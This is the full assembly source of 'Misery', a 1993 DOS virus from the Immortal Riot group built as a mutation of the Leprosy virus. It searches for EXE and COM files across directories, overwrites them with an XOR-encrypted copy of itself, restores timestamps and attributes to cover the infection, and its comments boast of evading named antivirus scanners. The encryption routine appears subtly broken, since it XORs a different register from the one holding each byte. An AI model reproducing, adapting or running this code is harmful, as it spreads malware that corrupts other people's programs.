; VirusName: Misery
; Country  : Sweden
; Author   : Metal Militia / Immortal Riot
; Date     : 07-22-1993
;
; This is an mutation of Leprosy from 'PCM2'.
; Many thanks to the scratch coder of Leprosy
;
; We've tried this virus ourself, and it works just fine.
; It copies itself into other exe/com files on the
; current drive, and uses dot-dot for changing directory.
; Originally found in the United States Of America.
;
; There has been many mutations born from this virus,
; and here we give you another contribution.
 
; McAfee Scan v105 can't find it, and
; S&S Toolkit 6.5 don't find it either.
; I haven't tried with scanners like Fprot/Tbscan,
; but they will probably report some virus structure.
;
; Best Regards : [Metal Militia]
;               [The Unforgiven]
 
                title   "MiSERY / Immortal Riot'93"
 
cr              equ     13              ;  Carriage return ASCII code
lf              equ     10              ;  Linefeed ASCII code
tab             equ     9               ;  Tab ASCII code
virus_size      equ     664             ;  Size of the virus file
code_start      equ     100h            ;  Address right after PSP in memory
dta             equ     80h             ;  Addr of default disk transfer area
datestamp       equ     24              ;  Offset in DTA of file's date stamp
timestamp       equ     22              ;  Offset in DTA of file's time stamp
filename        equ     30              ;  Offset in DTA of ASCIIZ filename
attribute       equ     21              ;  Offset in DTA of file attribute
 
 
        code    segment 'code'          ;  Open code segment
        assume  cs:code,ds:code         ;  One segment for both code & data
                org     code_start      ;  Start code image after PSP
 
;---------------------------------------------------------------------
;  All executable code is contained in boundaries of procedure "main".
;  The following code, until the start of "virus_code", is the non-
;  encrypted CMT portion of the code to load up the real program.
;---------------------------------------------------------------------
main    proc    near                    ;  Code execution begins here
        call    encrypt_decrypt         ;  Decrypt the real virus code
        jmp     random_mutation         ;  Put the virus into action
 
encrypt_val     db      00h             ;  Hold value to encrypt by here
 
; ----------  Encrypt, save, and restore the virus code  -----------
infect_file:
        mov     bx,handle               ;  Get the handle
        push    bx                      ;  Save it on the stack
        call    encrypt_decrypt         ;  Encrypt most of the code
        pop     bx                      ;  Get back the handle
        mov     cx,virus_size           ;  Total number of bytes to write
        mov     dx,code_start           ;  Buffer where code starts in memory
        mov     ah,40h                  ;  DOS write-to-handle service
        int     21h                     ;  Write the virus code into the file
        call    encrypt_decrypt         ;  Restore the code as it was
        ret                             ;  Go back to where you came from
 
; ---------------  Encrypt or decrypt the virus code  ----------------
encrypt_decrypt:
        mov     bx,offset virus_code    ;  Get address to start encrypt/decrypt
xor_loop:                               ;  Start cycle here
        mov     ah,[bx]                 ;  Get the current byte
        xor     al,encrypt_val          ;  Engage/disengage XOR scheme on it
        mov     [bx],ah                 ;  Put it back where we got it
        inc     bx                      ;  Move BX ahead a byte
        cmp     bx,offset virus_code+virus_size  ;  Are we at the end?
        jle     xor_loop                ;  If not, do another cycle
        ret                             ;  and go back where we came from
 
;-----------------------------------------------------------------------
;   The rest of the code from here on remains encrypted until run-time,
;   using a fundamental XOR technique that changes via CMT.
;-----------------------------------------------------------------------
virus_code:
 
;----------------------------------------------------------------------------
;  All strings are kept here in the file, and automatically encrypted.
;  Please don't be a lamer and change the strings and say you wrote a virus.
;  Because of Cybernetic Mutation Technology(tm), the CRC of this file often
;  changes, even when the strings stay the same.
;----------------------------------------------------------------------------
exe_filespec    db      "*.EXE",0 ; To infect EXE's
com_filespec    db      "*.COM",0 ; To infect COM's
newdir          db      "..",0 ; Move up one directory
fake_msg        db      cr,lf,"Metal up your ass..$"
virus_msg1      db      cr,lf,tab,"My friend of Misery...$"
virus_msg2      db      cr,lf,tab,"Hearing only what you want to hear $"
virus_msg3      db      cr,lf,tab,"and knowing only what you've heard$"
virus_msg4      db      cr,lf,tab,"you     you're smothered in tragedy$"
virus_msg5 db cr,lf,tab,"you're out to save the world$"
compare_buf     db      20 dup (?)      ;  Buffer to compare files in
files_found     db      ?
files_infected  db      ?
orig_time       dw      ?
orig_date       dw      ?
orig_attr       dw      ?
handle          dw      ?
success         db      ?
 
random_mutation:                        ; First decide if virus is to mutate
        mov     ah,2ch                  ; Set up DOS function to get time
        int     21h
        cmp     encrypt_val,0           ; Is this a first-run virus copy?
        je      install_val             ; If so, install whatever you get.
        cmp     dh,15                   ; Is it less than 16 seconds?
        jg      find_extension          ; If not, don't mutate this time
install_val:
        cmp     dl,0                    ; Will we be encrypting using zero?
        je      random_mutation         ; If so, get a new value.
        mov     encrypt_val,dl          ; Otherwise, save the new value
find_extension:                         ; Locate file w/ valid extension
        mov     files_found,0           ; Count infected files found
        mov     files_infected,4        ; BX counts file infected so far
        mov     success,0
find_exe:
        mov     cx,00100111b            ; Look for all flat file attributes
        mov     dx,offset exe_filespec  ; Check for .EXE extension first
        mov     ah,4eh                  ; Call DOS find first service
        int     21h
        cmp     ax,12h                  ; Are no files found?
        je      find_com                ; If not, nothing more to do
        call    find_healthy            ; Otherwise, try to find healthy .EXE
find_com:
        mov     cx,00100111b            ; Look for all flat file attributes
        mov     dx,offset com_filespec  ; Check for .COM extension now
        mov     ah,4eh                  ; Call DOS find first service
        int     21h
        cmp     ax,12h                  ; Are no files found?
        je      chdir                   ; If not, step back a directory
        call    find_healthy            ; Otherwise, try to find healthy .COM
chdir:                                  ; Routine to step back one level
        mov     dx,offset newdir        ; Load DX with address of pathname
        mov     ah,3bh                  ; Change directory DOS service
        int     21h
        dec     files_infected          ; This counts as infecting a file
        jnz     find_exe                ; If we're still rolling, find another
        jmp     exit_virus              ; Otherwise let's pack it up
find_healthy:
        mov     bx,dta                  ; Point BX to address of DTA
        mov     ax,[bx]+attribute       ; Get the current file's attribute
        mov     orig_attr,ax            ; Save it
        mov     ax,[bx]+timestamp       ; Get the current file's time stamp
        mov     orig_time,ax            ; Save it
        mov     ax,[bx]+datestamp       ; Get the current file's data stamp
        mov     orig_date,ax            ; Save it
        mov     dx,dta+filename         ; Get the filename to change attribute
        mov     cx,0                    ; Clear all attribute bytes
        mov     al,1                    ; Set attribute sub-function
        mov     ah,43h                  ; Call DOS service to do it
        int     21h
        mov     al,2                    ; Set up to open handle for read/write
        mov     ah,3dh                  ; Open file handle DOS service
        int     21h
        mov     handle,ax               ; Save the file handle
        mov     bx,ax                   ; Transfer the handle to BX for read
        mov     cx,20                   ; Read in the top 20 bytes of file
        mov     dx,offset compare_buf   ; Use the small buffer up top
        mov     ah,3fh                  ; DOS read-from-handle service
        int     21h
        mov     bx,offset compare_buf   ; Adjust the encryption value
        mov     ah,encrypt_val          ; for accurate comparison
        mov     [bx+6],ah
        mov     si,code_start           ; One array to compare is this file
        mov     di,offset compare_buf   ; The other array is the buffer
        mov     ax,ds                   ; Transfer the DS register...
        mov     es,ax                   ; ...to the ES register
        cld
        repe    cmpsb                   ; Compare the buffer to the virus
        jne     healthy                 ; If different, the file is healthy!
        call    close_file              ; Close it up otherwise
        inc     files_found             ; Chalk up another fucked up file
continue_search:
        mov     ah,4fh                  ; Find next DOS function
        int     21h                     ; Try to find another same type file
        cmp     ax,12h                  ; Are there any more files?
        je      no_more_found           ; If not, get outta here
        jmp     find_healthy            ; If so, try the process on this one!
no_more_found:
        ret                             ; Go back to where we came from
healthy:
        mov     bx,handle               ; Get the file handle
        mov     ah,3eh                  ; Close it for now
        int     21h
        mov     ah,3dh                  ; Open it again, to reset it
        mov     dx,dta+filename
        mov     al,2
        int     21h
        mov     handle,ax               ; Save the handle again
        call    infect_file             ; Infect the healthy file
        call    close_file              ; Close down this operation
        inc     success                 ; Indicate we did something this time
        dec     files_infected          ; Scratch off another file on agenda
        jz      exit_virus              ; If we're through, terminate
        jmp     continue_search         ; Otherwise, try another
        ret
close_file:
        mov     bx,handle               ; Get the file handle off the stack
        mov     cx,orig_time            ; Get the date stamp
        mov     dx,orig_date            ; Get the time stamp
        mov     al,1                    ; Set file date/time sub-service
        mov     ah,57h                  ; Get/Set file date and time service
        int     21h                     ; Call DOS
        mov     bx,handle
        mov     ah,3eh                  ; Close handle DOS service
        int     21h
        mov     cx,orig_attr            ; Get the file's original attribute
        mov     al,1                    ; Instruct DOS to put it back there
        mov     dx,dta+filename         ; Feed it the filename
        mov     ah,43h                  ; Call DOS
        int     21h
        ret
exit_virus:
        cmp     files_found,15          ; Are at least 15 files infected?
        jl      print_fake              ; If not, keep a low profile
        cmp     success,0               ; Did we infect anything?
        jg      print_fake              ; If so, cover it up
        mov     ah,09h                  ; Use DOS print string service
        mov     dx,offset virus_msg1    ; Load the address of the first line
        int     21h                     ; Print it
        mov     dx,offset virus_msg2    ; Load the second line
        int     21h                     ; (etc)
        mov     dx,offset virus_msg3
        int     21h
        mov     dx,offset virus_msg4
 int 21h
 mov dx,offset virus_msg5
        int     21h
        jmp     terminate
print_fake:
        mov     ah,09h                  ; Use DOS to print fake error message
        mov     dx,offset fake_msg
        int     21h
terminate:
        mov     ah,4ch                  ; DOS terminate process function
        int     21h                     ; Call DOS to get out of this program
 
filler          db       8 dup (90h)    ; Pad out the file length to 666 bytes
 
main    endp
code    ends
        end     main
 
 